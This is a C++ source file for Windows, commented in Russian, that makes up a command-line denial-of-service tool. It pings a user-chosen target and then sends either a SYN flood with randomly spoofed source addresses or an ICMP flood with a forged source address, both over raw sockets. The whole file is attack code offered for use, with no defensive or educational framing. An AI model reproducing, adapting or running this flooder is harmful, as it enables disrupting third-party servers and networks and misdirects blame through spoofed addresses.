#define _WIN32_WINNT 0x0601
#define _CRT_SECURE_NO_WARNINGS
#define _WINSOCK_DEPRECATED_NO_WARNINGS

#include <iostream>
#include <winsock2.h>
#include <ws2tcpip.h>
#include <iphlpapi.h>
#include <icmpapi.h>
#include <chrono>
#include <thread>
#include <random>

#pragma comment(lib, "iphlpapi.lib")
#pragma comment(lib, "Ws2_32.lib")

// Определение структур заголовков
typedef struct ip_header {
    BYTE ver_ihl;
    BYTE tos;
    USHORT total_length;
    USHORT ident;
    USHORT flags_fo;
    BYTE ttl;
    BYTE protocol;
    USHORT checksum;
    ULONG src_addr;
    ULONG dest_addr;
} IPV4_HDR;

typedef struct tcp_header {
    USHORT src_port;
    USHORT dst_port;
    ULONG seq_num;
    ULONG ack_num;
    BYTE data_off;
    BYTE flags;
    USHORT window;
    USHORT checksum;
    USHORT urg_ptr;
} TCP_HDR;

typedef struct icmp_header {
    BYTE type;
    BYTE code;
    USHORT checksum;
    USHORT id;
    USHORT seq;
} ICMP_HDR;

#define TH_SYN 0x02

// Функция расчета контрольной суммы
USHORT checksum(USHORT* buffer, int size) {
    unsigned long cksum = 0;
    while (size > 1) {
        cksum += *buffer++;
        size -= sizeof(USHORT);
    }
    if (size) cksum += *(UCHAR*)buffer;
    cksum = (cksum >> 16) + (cksum & 0xffff);
    cksum += (cksum >> 16);
    return (USHORT)(~cksum);
}

// Проверка доступности хоста
bool is_alive(const char* ip) {
    HANDLE hIcmp = IcmpCreateFile();
    if (hIcmp == INVALID_HANDLE_VALUE) {
        std::cerr << "IcmpCreateFile failed: " << GetLastError() << std::endl;
        return false;
    }

    char sendData[32] = "Test";
    DWORD replySize = sizeof(ICMP_ECHO_REPLY) + sizeof(sendData) + 8; // Увеличиваем размер буфера
    std::unique_ptr<char[]> replyBuffer(new char[replySize]);         // Используем unique_ptr для управления памятью

    IPAddr destination;
    InetPtonA(AF_INET, ip, &destination);

    DWORD ret = IcmpSendEcho2(
        hIcmp,
        NULL,
        NULL,
        NULL,
        destination,
        sendData,
        sizeof(sendData),
        NULL,
        replyBuffer.get(),
        replySize,
        1000
    );

    IcmpCloseHandle(hIcmp);

    if (ret == 0) {
        std::cerr << "ICMP request failed with error: " << GetLastError() << std::endl;
        return false;
    }

    PICMP_ECHO_REPLY echoReply = (PICMP_ECHO_REPLY)replyBuffer.get();
    if (echoReply->Status != IP_SUCCESS) {
        std::cerr << "ICMP status: " << echoReply->Status << std::endl;
        return false;
    }

    return true;
}

// SYN-flood атака
void syn_flood(const char* target_ip, int port, int count, int delay) {
    SOCKET s = socket(AF_INET, SOCK_RAW, IPPROTO_TCP);
    if (s == INVALID_SOCKET) {
        std::cerr << "Socket error: " << WSAGetLastError() << std::endl;
        return;
    }

    char packet[sizeof(IPV4_HDR) + sizeof(TCP_HDR)] = { 0 };
    IPV4_HDR* iph = (IPV4_HDR*)packet;
    TCP_HDR* tcph = (TCP_HDR*)(packet + sizeof(IPV4_HDR));

    std::random_device rd;
    std::mt19937 gen(rd());
    std::uniform_int_distribution<> dist(1024, 65535);

    sockaddr_in dest_addr{};
    dest_addr.sin_family = AF_INET;
    dest_addr.sin_port = htons(port);
    InetPtonA(AF_INET, target_ip, &dest_addr.sin_addr);

    for (int i = 0; i < count; ++i) {
        // Заполнение IP-заголовка
        iph->ver_ihl = 0x45;
        iph->tos = 0;
        iph->total_length = htons(sizeof(packet));
        iph->ident = htons(static_cast<u_short>(dist(gen)));
        iph->flags_fo = 0;
        iph->ttl = 128;
        iph->protocol = IPPROTO_TCP;
        iph->src_addr = htonl(dist(gen));
        iph->dest_addr = dest_addr.sin_addr.s_addr;

        // Заполнение TCP-заголовка
        tcph->src_port = htons(dist(gen));
        tcph->dst_port = htons(port);
        tcph->seq_num = htonl(dist(gen));
        tcph->ack_num = 0;
        tcph->data_off = (5 << 4);
        tcph->flags = TH_SYN;
        tcph->window = htons(65535);
        tcph->checksum = 0;
        tcph->urg_ptr = 0;

        // Расчет контрольных сумм
        iph->checksum = checksum((USHORT*)iph, sizeof(IPV4_HDR));
        tcph->checksum = checksum((USHORT*)tcph, sizeof(TCP_HDR));

        sendto(s, packet, sizeof(packet), 0, (sockaddr*)&dest_addr, sizeof(dest_addr));
        std::this_thread::sleep_for(std::chrono::milliseconds(delay));
    }
    closesocket(s);
}

// ICMP-flood атака
void icmp_flood(const char* target_ip, int count, int delay) {
    SOCKET s = socket(AF_INET, SOCK_RAW, IPPROTO_ICMP);
    if (s == INVALID_SOCKET) {
        std::cerr << "Socket error: " << WSAGetLastError() << std::endl;
        return;
    }

    char packet[sizeof(IPV4_HDR) + sizeof(ICMP_HDR)] = { 0 };
    IPV4_HDR* iph = (IPV4_HDR*)packet;
    ICMP_HDR* icmph = (ICMP_HDR*)(packet + sizeof(IPV4_HDR));

    sockaddr_in dest_addr{};
    dest_addr.sin_family = AF_INET;
    InetPtonA(AF_INET, target_ip, &dest_addr.sin_addr);

    for (int i = 0; i < count; ++i) {
        // Заполнение IP-заголовка
        iph->ver_ihl = 0x45;
        iph->tos = 0;
        iph->total_length = htons(sizeof(packet));
        iph->ident = htons(1);
        iph->flags_fo = 0;
        iph->ttl = 128;
        iph->protocol = IPPROTO_ICMP;
        iph->src_addr = htonl(0x01010101);
        iph->dest_addr = dest_addr.sin_addr.s_addr;

        // Заполнение ICMP-заголовка
        icmph->type = 8;
        icmph->code = 0;
        icmph->checksum = 0;
        icmph->id = 1;
        icmph->seq = i;

        icmph->checksum = checksum((USHORT*)icmph, sizeof(ICMP_HDR));

        sendto(s, packet, sizeof(packet), 0, (sockaddr*)&dest_addr, sizeof(dest_addr));
        std::this_thread::sleep_for(std::chrono::milliseconds(delay));
    }
    closesocket(s);
}

int main() {
    WSADATA wsaData;
    if (WSAStartup(MAKEWORD(2, 2), &wsaData) != 0) {
        std::cerr << "WSAStartup failed\n";
        return 1;
    }

    std::string target_ip;
    std::cout << "Enter target IP: ";
    std::cin >> target_ip;

    if (!is_alive(target_ip.c_str())) {
        std::cerr << "Target is not alive or not responding to ICMP\n";
        WSACleanup();
        return 1;
    }

    int attack_type, count, delay, port = 80;
    std::cout << "Choose attack type (1 - SYN, 2 - ICMP): ";
    std::cin >> attack_type;
    std::cout << "Enter packet count: ";
    std::cin >> count;
    std::cout << "Enter delay (ms): ";
    std::cin >> delay;

    if (attack_type == 1) {
        std::cout << "Enter target port: ";
        std::cin >> port;
        syn_flood(target_ip.c_str(), port, count, delay);
    }
    else if (attack_type == 2) {
        icmp_flood(target_ip.c_str(), count, delay);
    }
    else {
        std::cerr << "Invalid attack type selected\n";
    }

    std::cout << "Attack completed.\n";
    WSACleanup();
    return 0;
}
